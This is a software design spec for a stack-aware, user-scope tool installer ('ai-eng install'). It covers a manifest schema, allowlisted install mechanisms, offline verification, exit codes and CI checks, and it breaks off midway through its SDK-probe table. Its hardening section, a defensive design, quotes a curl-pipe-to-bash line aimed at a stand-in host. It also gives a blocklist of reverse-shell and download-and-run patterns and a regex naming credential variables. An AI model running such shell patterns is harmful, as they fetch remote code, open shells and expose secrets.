---
spec: spec-101
title: Installer Robustness — Stack-Aware User-Scope Tool Bootstrap
status: approved
effort: large
refs:
  - .ai-engineering/notes/adoption-s2-commit-pr-speed.md
  - .ai-engineering/notes/adoption-s3-unified-gate-risk-accept.md
  - .ai-engineering/notes/adoption-s4-skills-consolidation-architecture.md
  - .ai-engineering/notes/adoption-s5-mcp-sentinel-ide-parity.md
---

# Spec 101 — Installer Robustness: Stack-Aware User-Scope Tool Bootstrap

## Summary

The current `ai-eng install` pipeline installs git hooks but never installs the tools those hooks require. `src/ai_engineering/installer/phases/tools.py:37` only verifies `gh`/`az`; ruff, ty, gitleaks, semgrep, pip-audit, pytest, prettier, eslint, tsc, dotnet-format, and jq are never installed or checked. The phase returns `PhaseVerdict.passed=True` (line 73-78) even when tools are missing. Users finish installation believing the framework is ready; their first `git commit` fails with "ruff not found — required". Additionally, existing pip-install logic in `installer/tools.py:194-200` targets an ambient virtualenv without `--python` or `--active`, failing silently in the common case where `VIRTUAL_ENV` is unset. A second pain point compounds adoption friction: every git worktree forces a full `.venv/` re-install because hook-generated PATH preambles and the doctor check both anchor to `<cwd>/.venv` (`hooks/manager.py:83-88`, `doctor/phases/tools.py:107`), and uv 0.4+'s `UV_PROJECT_ENVIRONMENT` env var is never used (zero references in the repo). The framework also supports 14 declared stacks (typescript, python, javascript, java, csharp, go, php, rust, kotlin, swift, dart, sql, bash, cpp) but `stack_runner.py` only wires three (python, dotnet, nextjs) — declaring an unwired stack in `manifest.yml` produces no checks and no warning. This spec rewires installation so `manifest.yml` declares `required_tools` for all 14 stacks as the single source of truth, the installer provisions the union of the universal baseline and detected stacks using strictly user-scope mechanisms (no sudo, no `npm install -g`, no writes outside the user's home), `python_env.mode` defaults to `uv-tool` so worktree creation no longer triggers a re-install, post-installation verification proves each tool is runnable under offline-safe conditions, language-SDK prereqs are detected per-stack with EXIT 81 + actionable links, time-to-first-commit on a clean machine with prereqs lands under ten minutes, and any failure produces a hard error with OS-specific copy-paste remediation. `ai-eng doctor --fix --phase tools` shares the same user-scope installer module so every health-repair path is DRY.

## Goals

- G-1: `.ai-engineering/manifest.yml` contains a `required_tools` block covering the 14 declared stacks (`baseline`, `python`, `typescript`, `javascript`, `java`, `csharp`, `go`, `php`, `rust`, `kotlin`, `swift`, `dart`, `sql`, `bash`, `cpp`) and the installer reads only from it — verifiable by `grep -A60 'required_tools:' .ai-engineering/manifest.yml` returning all 15 keys (baseline + 14 stacks) and by removal of the hardcoded tool lists in `installer/tools.py` and `doctor/phases/tools.py`.
- G-2: On a clean project on macOS, Ubuntu, and Windows, `ai-eng install` followed by `git commit --allow-empty -m "test"` exits 0 with no "tool not found" errors — verifiable in CI matrix jobs `install-smoke-macos`, `install-smoke-ubuntu`, `install-smoke-windows`.
- G-3: When any required tool cannot be installed user-scope, `ai-eng install` exits with code 80 (the framework-reserved "install tools failed" code defined in D-101-11) and prints a per-tool copy-paste remediation command — verifiable by a CI job that runs `env -i PATH="" ai-eng install` (empty environment, no tool in PATH) on a project fixture with a pinned manifest and asserts exit 80 plus stderr matching `/install tools failed.*(brew install|uv tool install|winget install|curl .+-o.+local\/bin)/i` for each baseline tool.
- G-4: Zero installations use `sudo`, `apt install`, `yum`, `dnf`, `/usr/local/bin` writes originated by our installer, `npm install -g`, `choco install`, or any subprocess whose `argv[0]` resolves outside the user-scope allowlist defined in D-101-02 — verifiable by (a) a unit test that grep-fails if any forbidden substring appears in `installer/user_scope_install.py`, (b) a runtime-guard integration test that asserts subprocess calls route only to allowlisted prefixes, and (c) `strace`/`dtruss`/`Process Monitor` logs captured in CI as evidence.
- G-5: `required_tools` entries support `platform_unsupported: [<os>]` — when present, that tool is skipped on the listed OS without failing the install — verifiable by a manifest fixture with `semgrep: {platform_unsupported: [windows]}` producing exit 0 on Windows CI, and by a lint test that fails when any tool lists all three OSes (abuse prevention — see D-101-03 governance).
- G-6: `ai-eng doctor --fix --phase tools` reads the same `required_tools` and uses the same `user_scope_install` module as the installer — verifiable by `ai-eng doctor --fix` on a project missing prettier (node stack) actually installing prettier to `node_modules/.bin/`.
- G-7: Post-install verification executes the tool's canonical offline-safe invocation recorded in `installer/tool_registry.py` (for example `gitleaks detect --no-git --source /dev/null --no-banner` for gitleaks; `<tool> --version` only for tools that phone home on broader invocations such as semgrep and pip-audit) and validates exit 0 plus a tool-specific regex. `shutil.which` alone is insufficient — verifiable by a test that places a non-executable file at `~/.local/bin/gitleaks` and confirms installer reports "not runnable".
- G-8: `install-state.json` records per-tool install state (`installed`, `skipped_platform_unsupported`, `failed_needs_manual`) with timestamp, OS release (`uname -r` on POSIX, `[System.Environment]::OSVersion` on Windows), and mechanism used — verifiable by JSON schema test, and a re-verify test where the OS release changing invalidates skip and triggers re-probe.
- G-9: `ai-eng install` is idempotent: re-running after partial failure skips already-installed tools whose probe still passes AND whose OS release still matches the recorded value, and retries only the failed ones — verifiable by a two-run test where the second run reports zero reinstallation attempts for tools already marked `installed`, plus a third-run test after synthetically bumping the recorded OS release to confirm re-probe fires.
- G-10: IDE-adapted mirrors (`.github/`, `.codex/`, `.gemini/`) pick up the `manifest.yml` `required_tools` schema change without drift — verifiable by `uv run ai-eng sync --check` (existing command, `src/ai_engineering/cli_commands/sync.py:26`, flag defined at line 33) passing in CI and by a test that asserts `.github/copilot-instructions.md` no longer references the removed hardcoded tool lists that were previously duplicated there.
- G-11: Time-to-first-commit on a clean machine with prereqs (`git`, `uv`) installed completes in **≤10 minutes** for any single-stack project (python OR typescript OR java, etc., individually) — verifiable by a CI job `install-time-budget` that runs `time bash -c "git clone <fixture> && cd <fixture> && ai-eng install . && git commit --allow-empty -m smoke"` and asserts the wall-clock is under 600 seconds across all 3 OSes for the python single-stack baseline. Stacks requiring SDK install (java, kotlin, swift, dart, csharp, go, rust, php, cpp) are excluded from G-11 because SDK install is NG-5 (user-owned).
- G-12: Worktree creation does not trigger a Python venv re-install in `python_env.mode=uv-tool` — verifiable by a CI job `worktree-fast-second` that runs `git worktree add ../wt2`, then `cd ../wt2 && ai-eng install . && git commit --allow-empty -m smoke` and asserts the second-worktree wall-clock is under 30 seconds (no `uv sync --dev`, no `.venv/` creation, all tools resolved from `~/.local/share/uv/tools/`).

## Non-Goals

- NG-1: Memoizing gate check results between invocations (scope of `adoption-s2-commit-pr-speed.md`).
- NG-2: Generalized risk acceptance bypass of gate failures (scope of `adoption-s3-unified-gate-risk-accept.md`).
- NG-3: Consolidating `/ai-dispatch`, `/ai-autopilot`, `/ai-run` or reducing SKILL.md verbosity (scope of `adoption-s4-skills-consolidation-architecture.md`).
- NG-4: MCP Sentinel hardening, IDE parity fixes, or agent naming alignment (scope of `adoption-s5-mcp-sentinel-ide-parity.md`).
- NG-5: Auto-installation of hard prerequisites (`uv`, `node`, `dotnet SDK`, `git`). These remain user-owned; `ai-eng doctor --check prereqs` surfaces them with links to official installers but never attempts to install them.
- NG-6: System-level installation. Any mechanism that requires admin/sudo/elevation is explicitly forbidden. This is a load-bearing invariant, not a nice-to-have.
- NG-7: Downloading arbitrary binaries from user-provided URLs. Only official release channels per tool (GitHub releases for gitleaks/jq, official package managers for others) and only when no native user-scope package manager is present and returns exit 0 within 5 seconds on a probe invocation (`brew --version`, `winget --version`, `scoop --version`).
- NG-8: Introducing new public CLI commands. `ai-eng install`, `ai-eng doctor`, and `ai-eng doctor --fix` remain the only public surfaces. An internal testing flag defined in D-101-11 is gated behind an env var and is not advertised.
- NG-9: Expanding the CI matrix beyond `macos-latest`, `ubuntu-latest`, `windows-latest` at the `uv` versions currently pinned in R-8. Broader matrix expansion is deferred; the 3-OS × pinned-uv matrix cost is accepted as the price of cross-OS correctness.
- NG-10: Offline/air-gapped install via pre-seeded binary bundles. Verify paths stay offline-safe per D-101-04, but a documented `--offline` install flow is tracked as OQ-3 and is explicitly not delivered here.
- NG-11: Auto-installation of language SDKs (JDK for java/kotlin, Xcode CLT or Swift toolchain for swift, Flutter or Dart SDK for dart, .NET SDK for csharp, Go toolchain, Rust toolchain via rustup, PHP runtime, LLVM/clang for cpp). All are NG-5 prerequisites — the doctor surfaces them with the official installer link and exits 81. Auto-installing language toolchains crosses into territory that has historically broken corporate-managed environments and licensing constraints (Xcode in particular).

## Decisions

### D-101-01: `manifest.yml` `required_tools` is the single source of truth (14 stacks)

`.ai-engineering/manifest.yml` gains a `required_tools` block covering the 14 declared stacks plus a universal baseline. Schema:

```yaml
required_tools:
  baseline:
    - {name: gitleaks}
    - {name: semgrep, platform_unsupported: [windows]}
    - {name: jq}
  python:
    - {name: ruff}
    - {name: ty}
    - {name: pip-audit}
    - {name: pytest, scope: user_global}        # via uv tool install in uv-tool mode (D-101-12)
  typescript:
    - {name: prettier, scope: project_local}
    - {name: eslint, scope: project_local}
    - {name: tsc, scope: project_local}
    - {name: vitest, scope: project_local}
  javascript:
    - {name: prettier, scope: project_local}
    - {name: eslint, scope: project_local}
    - {name: vitest, scope: project_local}
  java:
    - {name: checkstyle}
    - {name: google-java-format}
    # tests run via mvn / gradle wrappers, scope: project_local
  csharp:
    - {name: dotnet-format}
    # dotnet test, dotnet vuln-check via SDK
  go:
    - {name: staticcheck}
    - {name: govulncheck}
    # gofmt, go test bundled with SDK
  php:
    - {name: phpstan}
    - {name: php-cs-fixer}
    - {name: composer}
  rust:
    - {name: cargo-audit}
    # rustfmt, clippy, cargo test bundled with SDK
  kotlin:
    - {name: ktlint}
    # JUnit via gradle, scope: project_local
  swift:
    platform_unsupported_stack: [linux, windows]   # see D-101-13 (stack-level)
    unsupported_reason: "swiftlint and swift-format have no Linux/Windows binaries"
    tools:
      - {name: swiftlint}
      - {name: swift-format}
  dart:
    # dart analyze, dart format, dart test bundled with SDK
    - {name: dart-stack-marker}   # placeholder — SDK alone covers it
  sql:
    - {name: sqlfluff}
  bash:
    - {name: shellcheck}
    - {name: shfmt}
  cpp:
    - {name: clang-tidy}
    - {name: clang-format}
    - {name: cppcheck}

prereqs:
  uv:
    version_range: ">=0.4.0,<1.0"
  sdk_per_stack:
    java: {name: JDK, min_version: "21", install_link: "https://adoptium.net/"}
    kotlin: {name: JDK, min_version: "21", install_link: "https://adoptium.net/"}
    swift: {name: Swift toolchain, install_link: "https://www.swift.org/install/"}
    dart: {name: Dart SDK, install_link: "https://dart.dev/get-dart"}
    csharp: {name: ".NET SDK", min_version: "9", install_link: "https://dotnet.microsoft.com/download"}
    go: {name: Go toolchain, install_link: "https://go.dev/dl/"}
    rust: {name: Rust toolchain, install_link: "https://rustup.rs/"}
    php: {name: PHP, min_version: "8.2", install_link: "https://www.php.net/downloads"}
    cpp: {name: clang/LLVM, install_link: "https://llvm.org/builds/"}
```

`installer/tools.py` and `doctor/phases/tools.py` remove their hardcoded `_PIP_INSTALLABLE` and `_REQUIRED_TOOLS` lists and import a single loader `state.manifest.load_required_tools(stacks: list[str]) -> list[ToolSpec]`. `policy/checks/stack_runner.py` `PRE_COMMIT_CHECKS` / `PRE_PUSH_CHECKS` registry becomes data-driven from the same manifest source — adding a stack to manifest without registering checks is impossible by construction.

**Carve-out for `scope: project_local`**: tools with this scope are catalogued in `required_tools` because `stack_runner.py` needs them at gate-execution time, but the installer DOES NOT install them — that responsibility belongs to the project's own package manager (`npm install`, `composer install`, `./mvnw install`, etc.). The installer records each project_local tool in `install-state.json` with `state: not_installed_project_local` and emits an info-level note: "stack X uses project-local launchers — ensure `<package-manager> install` has been run." When the project's manifest file is missing (e.g., `package.json` for typescript), the installer fails with EXIT 80 + the exact bootstrap command (per R-3 pattern). This boundary keeps the framework out of the project's dependency graph while still surfacing onboarding issues at install time.

**Rationale**: drift between installer (`_PIP_INSTALLABLE` ruff/ty/pip-audit), doctor (`_REQUIRED_TOOLS` ruff/ty/gitleaks/semgrep/pip-audit), and stack_runner (PRE_COMMIT_CHECKS python/dotnet/nextjs only) is itself a source of bugs and was the root cause of the observed "manifest declares stack X but no checks fire" failure mode (R-15). One manifest key, one loader, one truth, three consumers. The `scope` field (`user_global`, `user_global_uv_tool`, `project_local`, `sdk_bundled`) encodes where the tool installs without hardcoding location in install logic. The `prereqs.sdk_per_stack` block makes SDK requirements declarative — D-101-14 enforces them.

### D-101-02: Install is user-scope only; any other mechanism is an error

Allowed installation mechanisms, per tool category:

| Tool category | Mechanism | Install path |
|---|---|---|
| Python CLI (ruff, ty, pip-audit, semgrep) | `uv tool install <tool>` | `~/.local/bin` (uv-managed) |
| Python project-venv (pytest) | `uv pip install --python .venv/bin/python <tool>` | `.venv/bin` |
| Node project-local (prettier, eslint, tsc, vitest) | `npm install --save-dev <tool>` (or `pnpm add -D`, `bun add -d`) | `node_modules/.bin` |
| .NET (dotnet-format) | `dotnet tool install --global <tool>` | `~/.dotnet/tools` (the `--global` flag is user-scope despite the name) |
| macOS-specific (gitleaks, jq) | `brew install <tool>` → fallback GitHub-release signed binary to `~/.local/bin/<tool>` when Homebrew is absent | `$(brew --prefix)/bin` (Homebrew user-owned, non-sudo; prefix resolved at runtime) or `~/.local/bin` |
| Linux binary (gitleaks, jq) | download signed release to `~/.local/bin/<tool>`, `chmod +x` | `~/.local/bin` |
| Windows (gitleaks, jq) | `winget install --scope user <id>` → fallback `scoop install <tool>` | user's WinGet/Scoop profile |

Forbidden: `sudo`, `apt`, `yum`, `dnf`, `npm install -g`, `choco install` (admin required by default), `Install-Package` without `-Scope CurrentUser`, and any write originated by our installer to paths outside the user's home plus the `$(brew --prefix)` directory that Homebrew itself owns.

`src/ai_engineering/installer/user_scope_install.py` is the single code path. Two independent controls enforce the rule:

1. **Static grep**: a unit test `test_no_forbidden_substrings.py` fails if any forbidden literal appears in the module (belt-and-suspenders, guards against accidental introductions).
2. **Runtime subprocess guard** (load-bearing): `user_scope_install.py` wraps every `subprocess.run` / `subprocess.Popen` call through `_safe_run(argv, ...)`. `_safe_run` resolves `argv[0]` via `shutil.which`, then asserts the resolved path starts with one of the allowlisted prefixes. Two distinct allowlists apply: (a) **install-target prefixes** where tools end up installed: `~/`, `~/.local/`, `~/.cargo/`, `~/.dotnet/`, `$(brew --prefix)/`, the active virtualenv's `bin/`, user's WinGet or Scoop profile directories. (b) **driver prefixes** for legitimate helper interpreters the installer itself invokes: the resolved path of `git`, `uv`, `python`, `node`, `npm`/`pnpm`/`bun`, `dotnet`, `brew`, `winget`, `scoop`, `curl` (used for signed GitHub release downloads only). The driver set is pinned in a module constant `DRIVER_BINARIES` with unit tests asserting every entry resolves to an existing executable at CI time. A call failing both allowlists raises `UserScopeViolation` before the subprocess is spawned. The runtime guard is effective against obfuscated forbidden substrings (string concatenation, reversed slicing, `getattr(os, "sys" + "tem")`) that grep cannot catch.

**Rationale**: enterprise adoption is the dominant blocker — IT ticket friction kills onboarding, and user-scope is the only path that works on a locked-down laptop. Grep alone is theatre against a motivated obfuscation; runtime path-guard is the real enforcement. Both are retained because belt-and-suspenders is cheap and catches accidental regressions that runtime guard only surfaces during CI integration runs.

**Hardening 3 — Compound shell chain detection (TOCTOU + bypass closure)**: argv-based allowlists are insufficient when a legitimately allowlisted driver (`bash`, `sh`, `pwsh`, `node`, `python`) is invoked with a shell-expression argument like `bash -c "curl evil.sh | bash"`. `_safe_run` MUST inspect the FULL argv when `argv[0]` resolves to a shell or interpreter and reject any compound-shell pattern detected: `|`, `&&`, `||`, `;` followed by `curl`/`wget`/`nc`/`base64`; `>& /dev/tcp/`; `bash -i`; `eval $(...)`; `$(...)` containing network primitives; `< <(curl...)`; `base64 -d | sh`. A shared blocklist module `installer/_shell_patterns.py` carries the regex set; a unit test asserts the blocklist matches every `curl|bash`-shaped sample and rejects no legitimate invocations (`bash -c "echo ok"` allowed).

**Hardening 4 — Cached absolute path resolution + sensitive env scrubbing**: `_safe_run` resolves each `argv[0]` ONCE at module import time into a frozen `RESOLVED_DRIVERS` dict mapping logical name → absolute path; subsequent calls use the cached absolute path directly, eliminating the TOCTOU race where an attacker mutates `$PATH` between `shutil.which` and exec. Additionally, every subprocess invocation passes `env=_scrubbed_env(os.environ)` where `_scrubbed_env` strips entries matching the sensitive-key regex `^(.+_API_KEY|.+_SECRET|.+_TOKEN|.+_PASSWORD|ANTHROPIC_API_KEY|AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|GITHUB_TOKEN|DATABASE_URL|GH_TOKEN|AZURE_.+_KEY|GOOGLE_APPLICATION_CREDENTIALS)$`. Tools that legitimately require a credential (none in the current registry) would have to register the exact env key in an explicit `_TOOL_ENV_ALLOW` allowlist with a written justification — none currently apply. A unit test runs every mechanism + every verify under an env-poisoned process (synthetic `ANTHROPIC_API_KEY=poison`, `AWS_SECRET_ACCESS_KEY=poison`, etc.) and asserts the spawned subprocess sees `KeyError` for every sensitive key. Standard env (`PATH`, `HOME`, `LANG`, `TZ`, `TERM`, OS-specific essentials) is preserved.

**Rationale (3 + 4)**: the path-allowlist guard is necessary but not sufficient. The MCP Sentinel patterns (NotebookLM 2026-04-25 query) document that argv-based controls are routinely bypassed via shell-expression arguments and that subprocess inheritance leaks secrets into tool processes that have no need for them. Compound-shell detection closes the bypass-via-`bash -c` route with a focused blocklist (not arbitrary shell parsing — only patterns observed in real-world exfil attacks). Env scrubbing ensures that a tool with a legitimate purpose (lint, format, audit) cannot accidentally leak credentials even if compromised upstream. Both controls are belt-and-suspenders alongside the path allowlist; combined, the guard becomes resilient to the `argv[0]` spoofing class of attacks that path-only checks miss. Coverage of these two hardenings is non-negotiable for a banking/healthcare adoption target.

### D-101-03: Hard fail on any uninstallable required tool; `platform_unsupported` is the only escape, and it is governed

When a required tool cannot be installed through any allowed mechanism for the current OS, the installer returns `PhaseVerdict.failed=True` with a structured `PhaseResult.failures` entry per tool, and `ai-eng install` exits code 80 (see D-101-11). The failure output includes, for each failed tool, the exact copy-paste command the user should run manually per their OS.

The single permitted bypass is `platform_unsupported: [<os>]` declared in the manifest. Governance rules for this field:

- At **tool-level** a tool may list at most **two** of `[darwin, linux, windows]`. Listing all three at tool-level makes the tool effectively optional and defeats the invariant — prohibited at tool-level.
- Legitimate "unsupported on multiple OSes" cases (e.g., swift tooling has no Linux/Windows binaries) MUST escalate to **stack-level** `platform_unsupported_stack` per D-101-13 — the entire stack is then declared unavailable on those OSes and any project that declares the stack on an unsupported OS gets a clear EXIT 81 with the install-link from `prereqs.sdk_per_stack`.
- `ai-eng validate manifest` (CI lint) fails the build when any tool lists all three OSes at tool-level, when an OS value is not one of the allowed three, or when stack-level `platform_unsupported_stack` is set without a corresponding `unsupported_reason`.
- Additions or modifications to `platform_unsupported` (tool-level or stack-level) require CODEOWNERS review on `.ai-engineering/manifest.yml`. CODEOWNERS entry is extended by this spec to cover the file.
- The unsupported reason MUST be captured in a sibling field `unsupported_reason: <string>` (e.g., `"semgrep has no Windows release"` or `"swiftlint and swift-format have no Linux/Windows binaries"`); the lint fails if `platform_unsupported` (any level) is present without `unsupported_reason`.

**Rationale**: the current bug is silent success — the user believes install completed, hits the failure later at commit time in a totally different context. The cost of a noisy true failure at install time is orders of magnitude lower than a silent broken state. `platform_unsupported` is the minimum carve-out needed because semgrep genuinely has no Windows support; without governance it becomes an abuse vector (mark everything unsupported to make install pass trivially). The two-of-three cap, CI lint, and CODEOWNERS review close that door.

### D-101-04: Post-install verification is offline-safe

After each install attempt, the installer executes the tool-specific canonical offline-safe invocation recorded in `installer/tool_registry.py` with a 10-second timeout, validates exit 0, and matches the output against a tool-specific regex (semver-shaped for most, non-empty for jq). Only a passing run marks the tool `installed` in state; anything else marks `failed_needs_manual`.

Verify invocations MUST NOT trigger network activity. Tools that phone home by default (semgrep, pip-audit for rule or DB refresh) are invoked with `--version` only — never `--config auto`, `--refresh`, or `--update`. For security-critical baseline tools we additionally run an end-to-end functional probe that is also offline-safe: `gitleaks detect --no-git --source /dev/null --no-banner` (exits 0 with no input). A second unit test confirms `tool_registry.py` verify commands pass when executed with `HTTPS_PROXY=http://127.0.0.1:1` (forced offline) — failures indicate a verify command has regressed to a network-touching mode.

**Rationale**: `shutil.which` returns paths for broken binaries too (wrong shebang, missing shared library, wrong architecture — common on Apple Silicon running x86_64 builds). Running the tool is the only proof of functional install, and running it offline-safely is mandatory for the framework's regulated enterprise audience where egress-blocked environments are the norm.

### D-101-05: Tool selection is driven by `resolved_stacks`, which already exists

The installer reuses `stack_runner.resolved_stacks` to determine which stack blocks to expand. Final set to install: `baseline ∪ {tools_for_stack for stack in resolved_stacks}`. No new stack detection code is introduced.

**Rationale**: the framework already resolves stacks for gate execution. Adding a second detection mechanism for install would risk divergence. One detection, two consumers (install, gate).

### D-101-06: Per-tool fallback chain lives in the installer registry, not the manifest

`installer/tool_registry.py` maps each tool name to a per-OS ordered list of mechanisms and a verify-command. Example:

```python
TOOL_REGISTRY = {
    "gitleaks": {
        "darwin": [BrewMechanism("gitleaks")],
        "linux": [GitHubReleaseBinaryMechanism("gitleaks/gitleaks", "gitleaks", sha256_pinned=True)],
        "win32": [WingetMechanism("gitleaks.gitleaks", scope="user"), ScoopMechanism("gitleaks")],
        "verify": {"cmd": ["gitleaks", "detect", "--no-git", "--source", "/dev/null", "--no-banner"], "regex": r"no leaks found"},
    },
    ...
}
```

The manifest stays declarative (which tools are needed); the registry owns procedural how.

**Rationale**: keeping procedural "how" out of the manifest keeps the manifest surface minimal and readable for the framework's enterprise audience who review `manifest.yml` but never `tool_registry.py`.

### D-101-07: `ai-eng install` is idempotent, with functional probes and OS-release-invalidated skip

`install-state.json` tracks each tool with `{state: installed|skipped_platform_unsupported|failed_needs_manual, mechanism: <name>, version: <semver>, verified_at: <ts>, os_release: <string>}`. The `os_release` value is captured at **major.minor granularity only**, deliberately coarser than a kernel point release to avoid nuisance re-probing. Resolution per OS:

- **macOS**: `sw_vers -productVersion` truncated to `<major>.<minor>` (e.g., `14.4.1` → `14.4`).
- **Linux**: `lsb_release -rs` truncated to `<major>.<minor>` (distro release like `22.04`); fall back to `/etc/os-release` `VERSION_ID` if `lsb_release` missing. Kernel point bumps (e.g., `6.8.0-45` → `6.8.0-47`) never trigger re-probe.
- **Windows**: `[System.Environment]::OSVersion.Version` as `<major>.<minor>` (e.g., `10.0` for Windows 10/11); Windows build numbers are intentionally ignored.

Subsequent runs of `ai-eng install` skip tools whose state is `installed` AND whose verify command (see D-101-04) still passes AND whose recorded `os_release` matches the current OS release at the granularity above. Any mismatch triggers a full re-verify. `--force` re-verifies and re-installs everything unconditionally. Retries run only on `failed_needs_manual` entries.

**Rationale**: iteration speed matters when an enterprise user resolves a permission issue and re-runs. Idempotence plus verify-on-skip gets the right balance. The `os_release` check is the guard against OS updates silently breaking binaries (Rosetta deprecation, dylib ABI changes, glibc version bumps) that pass `--version` but fail in real usage. Coarse granularity avoids re-probing on routine point/patch updates that do not affect binary ABI in practice.

### D-101-08: `ai-eng doctor --fix --phase tools` shares the install module

The user-scope install logic is extracted to `src/ai_engineering/installer/user_scope_install.py` and imported by both `installer/phases/tools.py` and `doctor/phases/tools.py`. The doctor phase stops hardcoding `_REQUIRED_TOOLS` and instead calls `load_required_tools(stacks)` for the same set the installer uses.

**Rationale**: today the two paths have drifted (doctor covers 5 tools, installer covers 2). One module, two callers eliminates that class of bug permanently.

### D-101-09: Breaking change without migration flag; CHANGELOG entry is BREAKING

The new behaviour (hard fail when a required tool cannot be installed) replaces the old behaviour (silent pass). No `--strict` opt-in flag. CHANGELOG includes a top-level BREAKING entry. First run of the new version prints a one-line banner: "`ai-eng install` now hard-fails on missing required tools (see CHANGELOG for migration)."

**Rationale**: the old behaviour is a critical adoption bug, not a feature. Preserving it behind a flag would mean users discovering the correct behaviour by chance. Consistent with the framework's own simplicity-first principle and with explicit user guidance to avoid backward-compatibility shims.

### D-101-10: Cross-OS install is proven by CI matrix, not manual testing

A new CI workflow `.github/workflows/install-smoke.yml` runs the full install path on `macos-latest`, `ubuntu-latest`, and `windows-latest`, against a clean project fixture, and asserts:

1. `ai-eng install` exits 0 for all 3 OSes with the default stack (python baseline).
2. `git commit --allow-empty -m "smoke"` succeeds on all 3 OSes without "tool not found".
3. `env -i PATH="" ai-eng install` (injected failure) produces exit 80 with non-empty remediation command in stderr.
4. `ai-eng install && ai-eng install` on the same project reports zero reinstallation attempts on the second run.
5. A forced OS-release mismatch (writing a synthetic `os_release` into `install-state.json`) triggers re-verify on the next run.

**Rationale**: manual cross-OS testing does not catch regressions. CI matrix is the only durable way to keep Windows and Linux functional while macOS remains the primary development target.

### D-101-11: Framework-reserved exit codes and internal test flags

The installer uses two framework-reserved exit codes:

- **EXIT 80** — "install tools failed": at least one required tool could not be installed user-scope. Chosen outside the `sysexits.h` 64-78 range (64=`EX_USAGE`, 65=`EX_DATAERR`, ... 78=`EX_CONFIG`) to avoid semantic collision with BSD-derived tooling. CI scripts grep for exit 80 specifically to distinguish this from other exit-1 conditions.
- **EXIT 81** — "install prereqs missing": a hard prerequisite named in NG-5 (`uv`, `node`, `dotnet SDK`, `git`) is absent. Separated so CI pipelines can route "need to install prereqs first" differently from "tool install failed."

**Precedence**: the prereqs phase runs BEFORE the tools phase. Any missing prereq (e.g., `uv` absent when a Python tool would be installed via `uv tool install`; `node` absent when a Node tool would use `npm install --save-dev`; `brew` absent when a macOS tool would use the Brew mechanism AND the GitHub-release fallback is not configured) yields EXIT 81 and the tools phase does not run. EXIT 80 is reserved strictly for cases where all prereqs are present but the install mechanism itself failed (network, SHA mismatch, disk full, etc.). This eliminates the EXIT 80 vs 81 ambiguity.

Internal testing mechanism (not advertised, for test use only): when the environment variable `AIENG_TEST=1` is set, the installer honors `AIENG_TEST_SIMULATE_FAIL=<tool-name>` by returning the synthetic failure path for that tool as if its install mechanism had failed. This is what verifier jobs use; external CI scripts that rely on this are unsupported and the flag may change without notice.

**Rationale**: reserving specific exit codes lets CI distinguish failure modes programmatically. Picking non-conflicting numbers avoids false positives. Isolating test hooks behind an env var keeps the public CLI surface clean per NG-8 while still enabling deterministic verifier tests.

### D-101-12: Python env mode flag with `uv-tool` as default; `.venv/` becomes opt-in

`.ai-engineering/manifest.yml` gains a `python_env` block:

```yaml
python_env:
  mode: uv-tool        # default
  # alternatives:
  #   venv             # legacy: per-cwd .venv/, current behaviour
  #   shared-parent    # worktree-aware: UV_PROJECT_ENVIRONMENT points to main checkout
```

Behaviour per mode:

- **`uv-tool` (default)**: every Python tool that today sits in a project venv (pytest, ruff if not via brew, ty, pip-audit, semgrep, sqlfluff) is installed via `uv tool install` and lives in `~/.local/share/uv/tools/`. The hook generator OMITS the `.venv/bin` PATH prepend in `hooks/manager.py:83-88` and `:114-115`. The doctor `_check_venv_health` returns `not_applicable` and skips the venv probe. `stack_runner.py` invokes pytest as `uv run --no-project --with pytest pytest` or directly as `pytest` (resolved via PATH). Worktrees inherit user-global tools instantly — no per-worktree venv.
- **`venv`**: legacy path; `.venv/` is created in the cwd; hook PATH prepends `.venv/bin`; doctor probes venv health. Identical to current behaviour.
- **`shared-parent`**: hook PATH preamble exports `UV_PROJECT_ENVIRONMENT="$(git rev-parse --git-common-dir)/../.venv"` so every worktree of the same project shares the venv anchored at the main checkout. The installer creates the venv at the shared location once.

**Non-git fallback for `shared-parent`**: when `mode=shared-parent` is selected but the project is NOT inside a git repository (`git rev-parse --git-common-dir` exits non-zero — fresh clone of a non-repo, `git init` not yet run, etc.), the installer exits 80 with the message "`mode=shared-parent` requires a git repository; either run `git init` first or set `python_env.mode: venv` in `.ai-engineering/manifest.yml`". No silent fallback to `mode=venv`; the user makes the choice explicitly.

The hook generator branches on `python_env.mode` at template-render time. The doctor `--fix` reads the mode and skips/applies venv operations accordingly. A migration helper `ai-eng install --python-env=venv` is recognised for users who explicitly want the legacy default.

**Rationale**: the worktree pain (full re-install on every `git worktree add`) traces to the hardcoded `.venv/bin` PATH prepend in `hooks/manager.py:83-88` and the `<cwd>/.venv` assumption in `doctor/phases/tools.py:107`. uv 0.4+'s `UV_PROJECT_ENVIRONMENT` exists for exactly this purpose but is unused in the repo today (zero references). Making `uv-tool` the default eliminates the most painful case (worktrees and CI runners alike load tools instantly) while `shared-parent` and `venv` remain available for users with hard requirements on a project-local Python environment. This is a BREAKING change in the same sense as D-101-09 — users with workflows that depend on `.venv/` must opt in explicitly. CHANGELOG entry covers both.

### D-101-13: Stack-level `platform_unsupported_stack` for OS-incompatible stacks

A stack key in `required_tools` may declare:

```yaml
required_tools:
  swift:
    platform_unsupported_stack: [linux, windows]
    unsupported_reason: "swiftlint and swift-format have no Linux/Windows binaries; XCTest requires Xcode"
    tools:
      - {name: swiftlint}
      - {name: swift-format}
```

When the current OS is in `platform_unsupported_stack` AND the project declares this stack in `providers.stacks`, the installer:
1. Skips the entire stack's tool installs.
2. Records `state: skipped_platform_unsupported_stack` for each tool.
3. Emits a single warning naming the stack and the reason.
4. Continues with other declared stacks.

If the project declares the stack but the user is on an unsupported OS AND there is no other supported way to run the project, the installer still completes (exit 0) but the gate phase later refuses to run the stack's checks — that surfaces as a clear "stack X cannot be run on this OS" message rather than a confusing "tool not found".

**Rationale**: D-101-03's tool-level "max 2 of 3 OSes" rule is correct for individual tools (an abuse vector exists) but breaks legitimately for entire stacks where every tool happens to be macOS-only (swift). Escalating to stack-level keeps the abuse-prevention semantics (one place to declare it, gated by CODEOWNERS) while permitting the genuine case. Without this, swift cannot be supported at all under D-101-03, which would force a special-case in code rather than data.

### D-101-14: SDK prereq detection per stack with EXIT 81 + actionable link

Before the tools phase runs, a new `prereqs/sdk.py` step iterates `resolved_stacks ∩ prereqs.sdk_per_stack.keys()` and verifies each declared SDK with its detection probe:

| Stack | Probe | EXIT-81 message includes |
|---|---|---|
| java | `java -version` exit 0 + parse `>= 21` | `https://adoptium.net/` (or SDKMAN) |
